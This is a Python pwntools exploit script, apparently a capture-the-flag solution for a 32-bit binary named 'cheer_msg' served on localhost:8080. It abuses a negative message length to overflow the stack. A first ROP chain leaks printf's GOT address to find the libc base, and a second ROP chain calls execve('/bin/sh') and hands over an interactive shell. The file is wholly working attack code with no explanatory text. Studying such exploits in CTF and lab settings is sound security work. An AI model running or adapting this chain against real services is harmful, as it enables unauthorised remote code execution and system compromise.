#!/usr/bin/env python
from pwn import *

rhp = {'host':"localhost", 'port':8080}

context(os = 'linux', arch = 'i386')
# context.log_level = 'debug'

binf = ELF('./cheer_msg')
addr_got_printf     = binf.got['printf']

libc = ELF('/lib/i386-linux-gnu/libc.so.6')
offset_libc_printf  = libc.symbols['printf']

#==========

def attack(conn):
    binf_rop = ROP(binf)
    binf_rop.printf(addr_got_printf)
    binf_rop.main()

    conn.recvuntil('Message Length >> ')
    conn.sendline(str(-144))
    conn.recvuntil('Name >> ')
    conn.sendline(str(binf_rop))
    conn.recvuntil('Message : \n')
    
    addr_libc_printf    = u32(conn.recv(4))
    libc.address        = addr_libc_printf - offset_libc_printf
    info('addr_libc_base = 0x%08x' % libc.address)
    addr_libc_str_sh    = next(libc.search('/bin/sh'))

    libc_rop = ROP(libc)
    libc_rop.execve(addr_libc_str_sh, 0, 0)
    
    conn.recvuntil('Message Length >> ')
    conn.sendline(str(-144))
    conn.recvuntil('Name >> ')
    conn.sendline(str(libc_rop))
    conn.recvuntil('Message : \n')

#==========

if __name__=='__main__':
    conn = remote(rhp['host'], rhp['port'])
    attack(conn)
    conn.interactive()
    
#==========
